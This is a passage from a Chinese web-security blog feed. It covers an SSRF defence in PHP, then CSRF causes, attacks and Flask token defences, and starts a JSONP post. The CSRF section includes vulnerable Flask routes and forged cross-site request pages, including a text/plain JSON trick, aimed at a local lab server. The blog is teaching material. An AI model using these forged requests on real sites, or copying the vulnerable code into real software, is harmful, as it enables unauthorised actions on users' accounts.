class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'172.16.0.0'</span>) &gt;&gt; <span class="number">20</span> == $ip &gt;&gt; <span class="number">20</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'192.168.0.0'</span>) &gt;&gt; <span class="number">16</span> == $ip &gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_inner_ipaddress)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.请求URL</span></span><br><span class="line">        CURL_SETOPT($ch, CURLOPT_URL, $url);</span><br><span class="line">        $res = CURL_EXEC($ch);</span><br><span class="line">        $code = curl_getinfo($ch,CURLINFO_HTTP_CODE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.如果有跳转，获取跳转URL执行1, 否则返回响应</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">300</span>&lt;=$code <span class="keyword">and</span> $code&lt;<span class="number">400</span>)&#123;</span><br><span class="line">            $headers = curl_getinfo($ch);</span><br><span class="line">            $url=$headers[<span class="string">"redirect_url"</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            CURL_CLOSE($ch) ;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="comment">// $url="http://localhost:8888/302.php";</span></span><br><span class="line">    $res=safe_request($url);</span><br><span class="line">    <span class="keyword">if</span>($res)</span><br><span class="line">        <span class="keyword">echo</span> var_dump($res);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>SSRF漏洞分析与利用，<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">http://www.91ri.org/17111.html</a></li><li>SSRF漏洞(原理&amp;绕过姿势)，<a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-41070.html</a></li><li>SSRF Tips，<a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></li><li>谈一谈如何在Python开发中拒绝SSRF漏洞，<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></li><li>PHP开发中防御SSRF，<a href="https://www.jianshu.com/p/6ea9b8652d73" target="_blank" rel="noopener">https://www.jianshu.com/p/6ea9b8652d73</a></li><li>SSRF in the Wild, <a href="https://medium.com/swlh/ssrf-in-the-wild-e2c598900434" target="_blank" rel="noopener">https://medium.com/swlh/ssrf-in-the-wild-e2c598900434</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全-SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF成因、攻击和防御</title>
      <link href="/csrf-CSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
      <url>/csrf-CSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF成因"><a href="#CSRF成因" class="headerlink" title="CSRF成因"></a>CSRF成因</h1><h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><h3 id="脆弱代码"><a href="#脆弱代码" class="headerlink" title="脆弱代码"></a>脆弱代码</h3><p>存在CSRF的GET型请求如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/get', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">        ret = <span class="string">"Admin do something!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = <span class="string">"No Privilege..."</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    user=request.args.get(<span class="string">"user"</span>, <span class="string">"Null"</span>)</span><br><span class="line">    session[<span class="string">"user"</span>]=user</span><br><span class="line">    template=<span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;h3&gt; Login as &#123;&#123; user &#125;&#125;... &lt;/h3&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><p>先使用<a href="http://127.0.0.1:8888/login?user=admin模拟用户admin登陆，从代码可以看到登陆后网站将用户身份（简单起见就是用户名）保存到session中。" target="_blank" rel="noopener">http://127.0.0.1:8888/login?user=admin模拟用户admin登陆，从代码可以看到登陆后网站将用户身份（简单起见就是用户名）保存到session中。</a><br><img src="/csrf-CSRF成因、攻击和防御/1549283807815.png" alt="1549283807815"></p><p>接着访问<a href="http://127.0.0.1:8888/get可以看到用户具有这一权限，可以进行操作（假设这一链接是一个关键操作，如重置密码或泄露其他敏感信息的操作）。" target="_blank" rel="noopener">http://127.0.0.1:8888/get可以看到用户具有这一权限，可以进行操作（假设这一链接是一个关键操作，如重置密码或泄露其他敏感信息的操作）。</a></p><p><img src="/csrf-CSRF成因、攻击和防御/1549284215038.png" alt="1549284215038"></p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>如果用户访问了恶意网页，恶意网页诱导用户访问<a href="http://127.0.0.1:8888/get或是用js发送一个get请求，那么用户由于sessionID还存在于浏览器中，因此会在无意间使用自己的身份重置密码，如用于访问了如下内容的网页：" target="_blank" rel="noopener">http://127.0.0.1:8888/get或是用js发送一个get请求，那么用户由于sessionID还存在于浏览器中，因此会在无意间使用自己的身份重置密码，如用于访问了如下内容的网页：</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">"GET"</span>, <span class="string">"http://127.0.0.1:8888/get"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">    xhr.send();</span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">        if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>尽管同源策略导致js拿不到结果，但是请求仍然会正常发送：</p><p><img src="/csrf-CSRF成因、攻击和防御/1549284680614.png" alt="1549284680614"></p><h2 id="POST-表单型"><a href="#POST-表单型" class="headerlink" title="POST 表单型"></a>POST 表单型</h2><h3 id="脆弱代码-1"><a href="#脆弱代码-1" class="headerlink" title="脆弱代码"></a>脆弱代码</h3><p>有人认为CSRF产生的原因是因为GET请求类型造成的，其实不然，如下就是一个POST类型的代码，它同样存在CSRF问题：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/post', methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        template=<span class="string">"""</span></span><br><span class="line"><span class="string">        &lt;form action="http://127.0.0.1:8888/reset" method="POST"&gt;</span></span><br><span class="line"><span class="string">        &lt;input name="action" type="text"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="submit"&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(request.form)</span><br><span class="line">        data=request.form[<span class="string">"action"</span>]</span><br><span class="line">        print(<span class="string">"session:"</span>,session)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            print(<span class="string">"Admin do"</span>, data)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Admin do "</span>+data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"No Privilege2..."</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No Privilege2..."</span></span><br></pre></td></tr></table></figure></p><h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>攻击者只需要同样的伪造POST表单即可，这里我们换用<code>fetch()</code>试一下，当然<code>XMLHttpRequest()</code>也可以。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'http://127.0.0.1:8888/post'</span>,&#123;<span class="attr">method</span>: <span class="string">'POST'</span>, <span class="attr">credentials</span>: <span class="string">'include'</span>, <span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>&#125;, <span class="attr">body</span>:<span class="string">'action=reset+password'</span>&#125;)</span><br></pre></td></tr></table></figure><p>尽管同源再一次没让我们拿到结果，但是请求还是发过去了：</p><p><img src="/csrf-CSRF成因、攻击和防御/1549285932946.png" alt="1549285932946"></p><h2 id="POST-JSON型"><a href="#POST-JSON型" class="headerlink" title="POST JSON型"></a>POST JSON型</h2><p>如果服务器严格限制了<code>Content-Type=application/json</code>，理论上是不存在CSRF的，因为该请求属于非简单请求，非简单请求会发先检请求确认是否允许跨域，如果不允许跨域的话js就没法使用cookie。</p><p>但是若服务器不判断content-type，那么攻击者就可以使用表单或是js伪造一个<code>Content-Type=text/plain</code>的请求。</p><h3 id="脆弱代码-2"><a href="#脆弱代码-2" class="headerlink" title="脆弱代码"></a>脆弱代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json', methods=['GET','POST','OPTIONS'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_json</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        template=<span class="string">"""</span></span><br><span class="line"><span class="string">        &lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">        function submitRequest() &#123;</span></span><br><span class="line"><span class="string">            var xhr = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">            xhr.open("POST", "http://127.0.0.1:8888/json", true);</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Accept", "*/*");</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");</span></span><br><span class="line"><span class="string">            xhr.withCredentials = true;</span></span><br><span class="line"><span class="string">            xhr.send(JSON.stringify(&#123;"action":"change passwd..."&#125;));</span></span><br><span class="line"><span class="string">            xhr.onreadystatechange = function()&#123;</span></span><br><span class="line"><span class="string">                if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span></span><br><span class="line"><span class="string">                    alert(xhr.responseText);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick="submitRequest()"&gt;Conform&lt;/button&gt;</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            data=json.loads(request.get_data(as_text=<span class="literal">True</span>))</span><br><span class="line">            ret=<span class="string">'Admin do '</span>+data[<span class="string">"action"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret=<span class="string">"No Privilege2..."</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><ol><li><p>使用表单伪造post，关键是用name字段构造一个合法的json：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8888/json"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"action":"change passwd...", "test":"'</span> <span class="attr">value</span>=<span class="string">'test"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用js伪造post json</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'http://127.0.0.1:8888/json'</span>,&#123;<span class="attr">method</span>: <span class="string">'POST'</span>, <span class="attr">credentials</span>: <span class="string">'include'</span>, <span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;, <span class="attr">body</span>:<span class="string">'&#123;"action":"reset password"&#125;'</span>&#125;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>主要有两种手段：</p><ol><li>根据Referer判断，但是要考虑没有referer字段的情况</li><li>增加一个随机的Token，前端发送后，后端比较是否一致，本文主要介绍这一种方法</li></ol><h2 id="GET型-1"><a href="#GET型-1" class="headerlink" title="GET型"></a>GET型</h2><p>在产生GET请求的地方就加一个csrf_token，在处理get请求时判断csrf_token与cookie或session中的token是否一致。</p><h2 id="POST表单型"><a href="#POST表单型" class="headerlink" title="POST表单型"></a>POST表单型</h2><p>对于flask，使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf.csrf <span class="keyword">import</span> CSRFProtect</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'you never guess'</span></span><br><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure><p>打开csrf保护，接着再对所有的表单添加一个隐藏字段即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrf_token"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; csrf_token() &#125;&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>增加隐藏字段后，每次POST时都会带有一个csrf_token，攻击者由于同源策略是无法获取这个token的，另外token写进session里面，即session和token是一对一关系，因此攻击者也无法通过自己的token猜测别人的token，而服务器再POST请求过来时就会验证这个token是否与session一致，若不一致则拒绝服务，这样一来攻击者就无法攻击成功了（除了把token放表单里，还可以放cookie里，攻击者仍然无法获取）</p><h2 id="POSTJSON型"><a href="#POSTJSON型" class="headerlink" title="POSTJSON型"></a>POSTJSON型</h2><p>理论上严格控制<code>content-type: application/json</code>就能解决问题，当然也可以用通用方法：</p><p>同样还是先开启CSRF防御：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf.csrf <span class="keyword">import</span> CSRFProtect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'random_secret_key'</span></span><br><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure><p>让自己站的ajax拿到csrf_token，就像之前说的，将token放进cookie里，使用app.after_request修饰使得每个页面返回时都执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">after_request</span><span class="params">(response)</span>:</span></span><br><span class="line">    <span class="comment"># 调用函数生成 csrf_token</span></span><br><span class="line">    csrf_token = generate_csrf()</span><br><span class="line">    <span class="comment"># 通过 cookie 将值传给前端</span></span><br><span class="line">    response.set_cookie(<span class="string">"csrf_token"</span>, csrf_token)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>接着ajax从cookie拿到token并放到headers里，不用担心攻击者，因为由于同源策略，他们没法获取其他网站的cookie：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json2', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json2</span><span class="params">()</span>:</span></span><br><span class="line">    template = <span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Normal&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt; Reset Password &lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">    $(document).ready(function()&#123;</span></span><br><span class="line"><span class="string">      $("button").click(function()&#123;</span></span><br><span class="line"><span class="string">        // body为"data=json"的请求</span></span><br><span class="line"><span class="string">        // var data = &#123;data: JSON.stringify(&#123;"action": "reset password"&#125;)&#125;</span></span><br><span class="line"><span class="string">        // body直接为json</span></span><br><span class="line"><span class="string">        var data = JSON.stringify(&#123;"action": "reset password"&#125;)</span></span><br><span class="line"><span class="string">        $.ajax(&#123;</span></span><br><span class="line"><span class="string">            url:"http://127.0.0.1:8888/json",</span></span><br><span class="line"><span class="string">            contentType: "application/json",</span></span><br><span class="line"><span class="string">            headers:&#123;'X-CSRFToken':$.cookie('csrf_token')&#125;,</span></span><br><span class="line"><span class="string">            dataType: "json",</span></span><br><span class="line"><span class="string">            type: 'POST',</span></span><br><span class="line"><span class="string">            data: data,</span></span><br><span class="line"><span class="string">            success: function (msg) &#123;</span></span><br><span class="line"><span class="string">                        alert(msg.status);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">            &#125;)</span></span><br><span class="line"><span class="string">      &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;button&gt;Conform&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>CSRF-Scanner——打造全自动检测CSRF漏洞利器，<a href="https://security.tencent.com/index.php/blog/msg/24" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/24</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全-CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> CSRF </tag>
            
            <tag> 防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSONP原理及其安全性问题</title>
      <link href="/jsonp-JSONP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98/"/>
      <url>/jsonp-JSONP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="JSONP原理"><a href="#JSONP原理" class="headerlink" title="JSONP原理"></a>JSONP原理</h1><p>JSONP（JSON with Padding）是一种跨域获取数据的方法，因为带<code>src</code>属性的标签如<code>&lt;script&gt;</code>允许跨域（1. 在CSP没有设置的情况下, 2.跨域时是可以带cookie的），因此前端可以设置一个callback请求并生成一个访问后台某个<code>&lt;script&gt;</code>的链接，后台在链接中动态的将数据包裹在先前的callback函数中，作为参数返回给前台，这样就完成了跨域获取数据的效果。</p><a id="more"></a><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><h3 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">'random_secret_key'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/remote.js', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remote</span><span class="params">()</span>:</span></span><br><span class="line">    _id=int(request.args.get(<span class="string">"id"</span>))</span><br><span class="line">    <span class="comment"># fetch data from database...</span></span><br><span class="line">    user=[</span><br><span class="line">        dict(username=<span class="string">"zhangsan"</span>,stat=<span class="string">"student"</span>),</span><br><span class="line">        dict(username=<span class="string">"lisi"</span>,stat=<span class="string">"working"</span>),</span><br><span class="line">        dict(username=<span class="string">"wangwu"</span>,stat=<span class="string">"student"</span>),</span><br><span class="line">    ]</span><br><span class="line">    callback=request.args.get(<span class="string">"callback"</span>)</span><br><span class="line">    json_data=json.dumps(user[_id])</span><br><span class="line">    template=<span class="string">"&#123;&#123;callback&#125;&#125;(&#123;&#123;json_data&#125;&#125;)"</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, callback=callback, json_data=json_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这样，加入我们访问<a href="http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，那么会得到如下结果：" target="_blank" rel="noopener">http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，那么会得到如下结果：</a></p><p><img src="/jsonp-JSONP原理及其安全性问题/1549265659864.png" alt="1549265659864"></p><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><p>那么前端就可以嵌入一个<code>&lt;script&gt;</code>标签，其中<code>src</code>设置为<a href="http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，以此获取数据：" target="_blank" rel="noopener">http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，以此获取数据：</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 